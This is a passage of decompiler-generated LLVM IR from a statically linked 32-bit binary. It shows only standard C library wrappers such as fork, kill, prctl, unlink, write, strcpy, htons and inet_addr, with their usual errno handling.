  ret i32 %v0_8049b65

; uselistorder directives
  uselistorder i32 %v1_8049b4c, { 1, 0, 2 }
  uselistorder i32 %v0_8049b44, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b64, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b6c = load i32, i32* @edi, align 4
  store i32 %v0_8049b6c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049b74 = load i32, i32* @ebx, align 4
  %v1_8049b7c = call i32 @close(i32 %arg1)
  store i32 %v0_8049b74, i32* @ebx, align 4
  store i32 %v1_8049b7c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049b7c, -4095
  br i1 %tmp, label %dec_label_pc_8049b94, label %dec_label_pc_8049b88

dec_label_pc_8049b88:                             ; preds = %entry
  %v1_8049b88 = call i32 @__errno_location(i32 %v0_8049b74)
  %v0_8049b8d = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b8d = sub i32 0, %v0_8049b8d
  %v2_8049b8f = inttoptr i32 %v1_8049b88 to i32*
  store i32 %v1_8049b8d, i32* %v2_8049b8f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b94

dec_label_pc_8049b94:                             ; preds = %entry, %dec_label_pc_8049b88
  %v0_8049b95 = phi i32 [ %v1_8049b7c, %entry ], [ -1, %dec_label_pc_8049b88 ]
  %v2_8049b98 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b98, i32* @edi, align 4
  ret i32 %v0_8049b95

; uselistorder directives
  uselistorder i32 %v1_8049b7c, { 1, 0, 2 }
  uselistorder i32 %v0_8049b74, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b94, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b9c = load i32, i32* @ebx, align 4
  store i32 %v0_8049b9c, i32* %stack_var_-4, align 4
  %v1_8049ba5 = call i32 @fork(i32 %v0_8049b9c)
  store i32 %v1_8049ba5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049ba5, -4095
  br i1 %tmp, label %dec_label_pc_8049bbc, label %dec_label_pc_8049bb0

dec_label_pc_8049bb0:                             ; preds = %entry
  %v0_8049bb0 = load i32, i32* %stack_var_-4, align 4
  %v1_8049bb0 = call i32 @__errno_location(i32 %v0_8049bb0)
  %v0_8049bb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049bb5 = sub i32 0, %v0_8049bb5
  %v2_8049bb7 = inttoptr i32 %v1_8049bb0 to i32*
  store i32 %v1_8049bb5, i32* %v2_8049bb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %entry, %dec_label_pc_8049bb0
  %v0_8049bbd = phi i32 [ %v1_8049ba5, %entry ], [ -1, %dec_label_pc_8049bb0 ]
  %v2_8049bbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049bbc, i32* @edx, align 4
  %v2_8049bc0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049bc0, i32* @ebx, align 4
  ret i32 %v0_8049bbd

; uselistorder directives
  uselistorder i32 %v1_8049ba5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049bbc, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049bc4 = load i32, i32* @ebx, align 4
  store i32 %v0_8049bc4, i32* %stack_var_-4, align 4
  %v1_8049bcd = call i32 @getpid(i32 %v0_8049bc4)
  store i32 %v1_8049bcd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049bcd, -4095
  br i1 %tmp, label %dec_label_pc_8049be4, label %dec_label_pc_8049bd8

dec_label_pc_8049bd8:                             ; preds = %entry
  %v0_8049bd8 = load i32, i32* %stack_var_-4, align 4
  %v1_8049bd8 = call i32 @__errno_location(i32 %v0_8049bd8)
  %v0_8049bdd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049bdd = sub i32 0, %v0_8049bdd
  %v2_8049bdf = inttoptr i32 %v1_8049bd8 to i32*
  store i32 %v1_8049bdd, i32* %v2_8049bdf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049be4

dec_label_pc_8049be4:                             ; preds = %entry, %dec_label_pc_8049bd8
  %v0_8049be5 = phi i32 [ %v1_8049bcd, %entry ], [ -1, %dec_label_pc_8049bd8 ]
  %v2_8049be8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049be8, i32* @ebx, align 4
  ret i32 %v0_8049be5

; uselistorder directives
  uselistorder i32 %v1_8049bcd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049be4, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049bec = load i32, i32* @ebx, align 4
  store i32 %v0_8049bec, i32* %stack_var_-4, align 4
  %v1_8049bf5 = call i32 @getppid(i32 %v0_8049bec)
  store i32 %v1_8049bf5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049bf5, -4095
  br i1 %tmp, label %dec_label_pc_8049c0c, label %dec_label_pc_8049c00

dec_label_pc_8049c00:                             ; preds = %entry
  %v0_8049c00 = load i32, i32* %stack_var_-4, align 4
  %v1_8049c00 = call i32 @__errno_location(i32 %v0_8049c00)
  %v0_8049c05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c05 = sub i32 0, %v0_8049c05
  %v2_8049c07 = inttoptr i32 %v1_8049c00 to i32*
  store i32 %v1_8049c05, i32* %v2_8049c07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049c0c

dec_label_pc_8049c0c:                             ; preds = %entry, %dec_label_pc_8049c00
  %v0_8049c0d = phi i32 [ %v1_8049bf5, %entry ], [ -1, %dec_label_pc_8049c00 ]
  %v2_8049c10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049c10, i32* @ebx, align 4
  ret i32 %v0_8049c0d

; uselistorder directives
  uselistorder i32 %v1_8049bf5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049c0c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049c14 = load i32, i32* @ebx, align 4
  store i32 %v0_8049c14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8049c27 = call i32 @kill(i32 %v0_8049c14, i32 %tmp4)
  store i32 %v2_8049c27, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049c27, -4095
  br i1 %tmp, label %dec_label_pc_8049c40, label %dec_label_pc_8049c34

dec_label_pc_8049c34:                             ; preds = %entry
  %v0_8049c34 = load i32, i32* %stack_var_-4, align 4
  %v1_8049c34 = call i32 @__errno_location(i32 %v0_8049c34)
  %v0_8049c39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c39 = sub i32 0, %v0_8049c39
  %v2_8049c3b = inttoptr i32 %v1_8049c34 to i32*
  store i32 %v1_8049c39, i32* %v2_8049c3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049c40

dec_label_pc_8049c40:                             ; preds = %entry, %dec_label_pc_8049c34
  %v0_8049c41 = phi i32 [ %v2_8049c27, %entry ], [ -1, %dec_label_pc_8049c34 ]
  %v2_8049c40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049c40, i32* @edx, align 4
  %v2_8049c44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049c44, i32* @ebx, align 4
  ret i32 %v0_8049c41

; uselistorder directives
  uselistorder i32 %v2_8049c27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049c40, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c48 = load i32, i32* @edi, align 4
  %v0_8049c49 = load i32, i32* @esi, align 4
  store i32 %v0_8049c49, i32* %stack_var_-8, align 4
  %v0_8049c61 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049c69 = call i32 @prctl(i32 %v0_8049c61, i32 %v0_8049c49)
  store i32 %v0_8049c61, i32* @ebx, align 4
  store i32 %v3_8049c69, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8049c69, -4095
  br i1 %tmp, label %dec_label_pc_8049c81, label %dec_label_pc_8049c75

dec_label_pc_8049c75:                             ; preds = %entry
  %v1_8049c75 = call i32 @__errno_location(i32 %v0_8049c61)
  %v0_8049c7a = load i32, i32* %esi.global-to-local, align 4
  %v1_8049c7a = sub i32 0, %v0_8049c7a
  %v2_8049c7c = inttoptr i32 %v1_8049c75 to i32*
  store i32 %v1_8049c7a, i32* %v2_8049c7c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049c81

dec_label_pc_8049c81:                             ; preds = %entry, %dec_label_pc_8049c75
  %v0_8049c82 = phi i32 [ %v3_8049c69, %entry ], [ -1, %dec_label_pc_8049c75 ]
  %v2_8049c84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049c84, i32* @esi, align 4
  store i32 %v0_8049c48, i32* @edi, align 4
  ret i32 %v0_8049c82

; uselistorder directives
  uselistorder i32 %v3_8049c69, { 1, 0, 2 }
  uselistorder i32 %v0_8049c61, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_8049c81, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049c89 = load i32, i32* @esi, align 4
  store i32 %v0_8049c89, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8049ca1 = load i32, i32* @ebx, align 4
  %v1_8049ca9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8049ca1, i32* @ebx, align 4
  store i32 %v1_8049ca9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049ca9, -4095
  br i1 %tmp, label %dec_label_pc_8049cc1, label %dec_label_pc_8049cb5

dec_label_pc_8049cb5:                             ; preds = %entry
  %v1_8049cb5 = call i32 @__errno_location(i32 %v0_8049ca1)
  %v0_8049cba = load i32, i32* %esi.global-to-local, align 4
  %v1_8049cba = sub i32 0, %v0_8049cba
  %v2_8049cbc = inttoptr i32 %v1_8049cb5 to i32*
  store i32 %v1_8049cba, i32* %v2_8049cbc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049cc1

dec_label_pc_8049cc1:                             ; preds = %entry, %dec_label_pc_8049cb5
  %v0_8049cc2 = phi i32 [ %v1_8049ca9, %entry ], [ -1, %dec_label_pc_8049cb5 ]
  %v2_8049cc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049cc4, i32* @esi, align 4
  ret i32 %v0_8049cc2

; uselistorder directives
  uselistorder i32 %v1_8049ca9, { 1, 0, 2 }
  uselistorder i32 %v0_8049ca1, { 1, 0 }
  uselistorder label %dec_label_pc_8049cc1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cc8 = load i32, i32* @edi, align 4
  store i32 %v0_8049cc8, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8049cd0 = load i32, i32* @ebx, align 4
  %v2_8049cd8 = call i32 @time(i32* %arg1)
  store i32 %v0_8049cd0, i32* @ebx, align 4
  store i32 %v2_8049cd8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049cd8, -4095
  br i1 %tmp, label %dec_label_pc_8049cf0, label %dec_label_pc_8049ce4

dec_label_pc_8049ce4:                             ; preds = %entry
  %v1_8049ce4 = call i32 @__errno_location(i32 %v0_8049cd0)
  %v0_8049ce9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049ce9 = sub i32 0, %v0_8049ce9
  %v2_8049ceb = inttoptr i32 %v1_8049ce4 to i32*
  store i32 %v1_8049ce9, i32* %v2_8049ceb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049cf0

dec_label_pc_8049cf0:                             ; preds = %entry, %dec_label_pc_8049ce4
  %v0_8049cf1 = phi i32 [ %v2_8049cd8, %entry ], [ -1, %dec_label_pc_8049ce4 ]
  %v2_8049cf0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049cf0, i32* @edx, align 4
  %v2_8049cf4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049cf4, i32* @edi, align 4
  ret i32 %v0_8049cf1

; uselistorder directives
  uselistorder i32 %v2_8049cd8, { 1, 0, 2 }
  uselistorder i32 %v0_8049cd0, { 1, 0 }
  uselistorder label %dec_label_pc_8049cf0, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cf8 = load i32, i32* @edi, align 4
  store i32 %v0_8049cf8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049d00 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049d08 = call i32 @unlink(i32 %v0_8049d00)
  store i32 %v0_8049d00, i32* @ebx, align 4
  store i32 %v1_8049d08, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049d08, -4095
  br i1 %tmp, label %dec_label_pc_8049d20, label %dec_label_pc_8049d14

dec_label_pc_8049d14:                             ; preds = %entry
  %v1_8049d14 = call i32 @__errno_location(i32 %v0_8049d00)
  %v0_8049d19 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049d19 = sub i32 0, %v0_8049d19
  %v2_8049d1b = inttoptr i32 %v1_8049d14 to i32*
  store i32 %v1_8049d19, i32* %v2_8049d1b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049d20

dec_label_pc_8049d20:                             ; preds = %entry, %dec_label_pc_8049d14
  %v0_8049d21 = phi i32 [ %v1_8049d08, %entry ], [ -1, %dec_label_pc_8049d14 ]
  %v2_8049d24 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049d24, i32* @edi, align 4
  ret i32 %v0_8049d21

; uselistorder directives
  uselistorder i32 %v1_8049d08, { 1, 0, 2 }
  uselistorder i32 %v0_8049d00, { 1, 0, 2 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049d20, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8049d39 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8049d39
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049d44 = load i32, i32* @edi, align 4
  store i32 %v0_8049d44, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049d54 = load i32, i32* @ebx, align 4
  %v4_8049d5c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8049d54, i32* @ebx, align 4
  store i32 %v4_8049d5c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8049d5c, -4095
  br i1 %tmp, label %dec_label_pc_8049d74, label %dec_label_pc_8049d68

dec_label_pc_8049d68:                             ; preds = %entry
  %v1_8049d68 = call i32 @__errno_location(i32 %v0_8049d54)
  %v0_8049d6d = load i32, i32* %edi.global-to-local, align 4
  %v1_8049d6d = sub i32 0, %v0_8049d6d
  %v2_8049d6f = inttoptr i32 %v1_8049d68 to i32*
  store i32 %v1_8049d6d, i32* %v2_8049d6f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049d74

dec_label_pc_8049d74:                             ; preds = %entry, %dec_label_pc_8049d68
  %v0_8049d75 = phi i32 [ %v4_8049d5c, %entry ], [ -1, %dec_label_pc_8049d68 ]
  %v2_8049d74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049d74, i32* @edx, align 4
  %v2_8049d78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049d78, i32* @edi, align 4
  ret i32 %v0_8049d75

; uselistorder directives
  uselistorder i32 %v4_8049d5c, { 1, 0, 2 }
  uselistorder i32 %v0_8049d54, { 1, 0 }
  uselistorder label %dec_label_pc_8049d74, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8049d80 = add i32 %arg1, 128
  %v6_8049d8b = icmp ugt i32 %v1_8049d80, 383
  br i1 %v6_8049d8b, label %dec_label_pc_8049d96, label %dec_label_pc_8049d8d

dec_label_pc_8049d8d:                             ; preds = %entry
  %v0_8049d8d = load i32, i32* bitcast (i32** @global_var_8052040.27 to i32*), align 64
  %v2_8049d92 = mul i32 %arg1, 2
  %v3_8049d92 = add i32 %v0_8049d8d, %v2_8049d92
  %v4_8049d92 = inttoptr i32 %v3_8049d92 to i16*
  %v5_8049d92 = load i16, i16* %v4_8049d92, align 2
  %v6_8049d92 = sext i16 %v5_8049d92 to i32
  store i32 %v6_8049d92, i32* @edx, align 4
  br label %dec_label_pc_8049d96

dec_label_pc_8049d96:                             ; preds = %entry, %dec_label_pc_8049d8d
  %v0_8049d96 = phi i32 [ %arg1, %entry ], [ %v6_8049d92, %dec_label_pc_8049d8d ]
  ret i32 %v0_8049d96

; uselistorder directives
  uselistorder label %dec_label_pc_8049d96, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8052520.28 to i32)
}

define i32 @clock() local_unnamed_addr {
entry:
  %tmp = call i64 @__decompiler_undefined_function_3()
  %stack_var_-16 = alloca i32, align 4
  %v2_8049da7 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8049dac = call i32 @times(i32 %v2_8049da7)
  %v4_8049db1 = trunc i64 %tmp to i32
  %v4_8049db5 = load i32, i32* %stack_var_-16, align 4
  %v5_8049db5 = add i32 %v4_8049db5, %v4_8049db1
  %v3_8049dbc = mul i32 %v5_8049db5, 10000
  %v1_8049dc2 = and i32 %v3_8049dbc, 2147483632
  ret i32 %v1_8049dc2
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049dc8 = load i32, i32* @edi, align 4
  %v4_8049dd1 = ptrtoint i8* %arg1 to i32
  %v5_8049dd5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8049dd5 = ptrtoint i8* %v5_8049dd5 to i32
  store i32 %v6_8049dd5, i32* @ecx, align 4
  store i32 %v0_8049dc8, i32* @edi, align 4
  ret i32 %v4_8049dd1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8049de1 = ptrtoint i8* %arg1 to i32
  %v2_8049de9 = mul i32 %arg2, 256
  %v3_8049de9 = and i32 %v2_8049de9, 65280
  %v4_8049de9 = and i32 %arg2, -65281
  %v5_8049de9 = or i32 %v3_8049de9, %v4_8049de9
  %v8_8049deb.pre = load i1, i1* @df, align 1
  %v9_8049deb = select i1 %v8_8049deb.pre, i32 -1, i32 1
  br label %dec_label_pc_8049deb

dec_label_pc_8049deb:                             ; preds = %dec_label_pc_8049df0, %entry
  %v4_8049deb = phi i32 [ %v6_8049deb, %dec_label_pc_8049df0 ], [ %v5_8049de9, %entry ]
  %v7_8049deb = phi i32 [ %v10_8049deb, %dec_label_pc_8049df0 ], [ %v4_8049de1, %entry ]
  %v1_8049deb = inttoptr i32 %v7_8049deb to i8*
  %v2_8049deb = load i8, i8* %v1_8049deb, align 1
  %v10_8049deb = add i32 %v7_8049deb, %v9_8049deb
  %v3_8049dec = udiv i32 %v4_8049deb, 256
  %v4_8049dec = trunc i32 %v3_8049dec to i8
  %v16_8049dec = icmp eq i8 %v2_8049deb, %v4_8049dec
  br i1 %v16_8049dec, label %dec_label_pc_8049df9.loopexit, label %dec_label_pc_8049df0

dec_label_pc_8049df0:                             ; preds = %dec_label_pc_8049deb
  %v3_8049deb = zext i8 %v2_8049deb to i32
  %v5_8049deb = and i32 %v4_8049deb, -256
  %v6_8049deb = or i32 %v3_8049deb, %v5_8049deb
  %v4_8049df0 = icmp eq i8 %v2_8049deb, 0
  %v1_8049df2 = icmp eq i1 %v4_8049df0, false
  br i1 %v1_8049df2, label %dec_label_pc_8049deb, label %dec_label_pc_8049df4

dec_label_pc_8049df4:                             ; preds = %dec_label_pc_8049df0
  br label %dec_label_pc_8049df9

dec_label_pc_8049df9.loopexit:                    ; preds = %dec_label_pc_8049deb
  %phitmp = add i32 %v10_8049deb, -1
  br label %dec_label_pc_8049df9

dec_label_pc_8049df9:                             ; preds = %dec_label_pc_8049df9.loopexit, %dec_label_pc_8049df4
  %v0_8049df9 = phi i32 [ 0, %dec_label_pc_8049df4 ], [ %phitmp, %dec_label_pc_8049df9.loopexit ]
  ret i32 %v0_8049df9

; uselistorder directives
  uselistorder i8 %v2_8049deb, { 1, 2, 0 }
  uselistorder i32 %v4_8049deb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049e01 = load i32, i32* @esi, align 4
  store i32 %v0_8049e01, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8049e09 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8049e09, i32* %edi.global-to-local, align 4
  %v4_8049e0d.pre = load i32, i32* @eax, align 4
  %v8_8049e0d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8049e0d

dec_label_pc_8049e0d:                             ; preds = %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge, %entry
  %v2_8049e0e = phi i32 [ %v7_8049e0e, %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge ], [ %v4_8049e09, %entry ]
  %v8_8049e0d = phi i1 [ %v5_8049e0e, %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge ], [ %v8_8049e0d.pre, %entry ]
  %v4_8049e0d = phi i32 [ %v0_8049e0f, %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge ], [ %v4_8049e0d.pre, %entry ]
  %v7_8049e0d = phi i32 [ %v0_8049e0d.pre, %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge ], [ %arg2, %entry ]
  %v1_8049e0d = inttoptr i32 %v7_8049e0d to i8*
  %v2_8049e0d = load i8, i8* %v1_8049e0d, align 1
  %v3_8049e0d = zext i8 %v2_8049e0d to i32
  %v5_8049e0d = and i32 %v4_8049e0d, -256
  %v6_8049e0d = or i32 %v3_8049e0d, %v5_8049e0d
  store i32 %v6_8049e0d, i32* %eax.global-to-local, align 4
  %v9_8049e0d = select i1 %v8_8049e0d, i32 -1, i32 1
  %v10_8049e0d = add i32 %v7_8049e0d, %v9_8049e0d
  store i32 %v10_8049e0d, i32* %esi.global-to-local, align 4
  %v3_8049e0e = inttoptr i32 %v2_8049e0e to i8*
  store i8 %v2_8049e0d, i8* %v3_8049e0e, align 1
  %v4_8049e0e = load i32, i32* %edi.global-to-local, align 4
  %v5_8049e0e = load i1, i1* @df, align 1
  %v6_8049e0e = select i1 %v5_8049e0e, i32 -1, i32 1
  %v7_8049e0e = add i32 %v6_8049e0e, %v4_8049e0e
  store i32 %v7_8049e0e, i32* %edi.global-to-local, align 4
  %v0_8049e0f = load i32, i32* %eax.global-to-local, align 4
  %v3_8049e0f = trunc i32 %v0_8049e0f to i8
  %v4_8049e0f = icmp eq i8 %v3_8049e0f, 0
  %v1_8049e11 = icmp eq i1 %v4_8049e0f, false
  br i1 %v1_8049e11, label %dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge, label %dec_label_pc_8049e13

dec_label_pc_8049e0d.dec_label_pc_8049e0d_crit_edge: ; preds = %dec_label_pc_8049e0d
  %v0_8049e0d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049e0d

dec_label_pc_8049e13:                             ; preds = %dec_label_pc_8049e0d
  store i32 %v4_8049e09, i32* %eax.global-to-local, align 4
  %v2_8049e17 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049e17, i32* @edx, align 4
  %v2_8049e18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049e18, i32* @esi, align 4
  ret i32 %v4_8049e09

; uselistorder directives
  uselistorder i32 %v0_8049e0f, { 1, 0 }
  uselistorder i32 %v7_8049e0e, { 1, 0 }
  uselistorder i1 %v5_8049e0e, { 1, 0 }
  uselistorder i32 %v4_8049e09, { 1, 2, 0, 3 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8049e2c = inttoptr i32 %arg2 to i8*
  %v3_8049e2c = call i32 @memmove(i8* %v2_8049e2c, i32 %arg1)
  ret i32 %v3_8049e2c
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8049e44 = inttoptr i32 %arg1 to i8*
  %v4_8049e44 = call i32 @strtok_r(i8* %v3_8049e44, i32 %arg2, i32 ptrtoint (i32* @global_var_805231c.29 to i32))
  ret i32 %v4_8049e44
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8049e55 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8049e55 = zext i16 %v3_8049e55 to i32
  ret i32 %v4_8049e55
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049e61 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049e61
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8049e69 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8049e69 = zext i16 %v3_8049e69 to i32
  ret i32 %v4_8049e69
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8049e75 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_8049e75
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_8049e7b = ptrtoint i32* %stack_var_-4 to i32
  %v2_8049e84 = inttoptr i32 %arg1 to i8*
  %v3_8049e84 = call i32 @inet_aton(i8* %v2_8049e84, i32 %v2_8049e7b)
  %v1_8049e8f = icmp eq i32 %v3_8049e84, 0
  br i1 %v1_8049e8f, label %dec_label_pc_8049e97, label %dec_label_pc_8049e93

dec_label_pc_8049e93:                             ; preds = %entry
  %v3_8049e93 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049e97

dec_label_pc_8049e97:                             ; preds = %entry, %dec_label_pc_8049e93
  %v0_8049e97 = phi i32 [ -1, %entry ], [ %v3_8049e93, %dec_label_pc_8049e93 ]
  ret i32 %v0_8049e97

; uselistorder directives
  uselistorder label %dec_label_pc_8049e97, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049ea3 = call i32 @__GI___h_errno_location()
  %v0_8049ea8 = load i32, i32* @edx, align 4
  %v2_8049eab = ptrtoint i32* %stack_var_-4 to i32
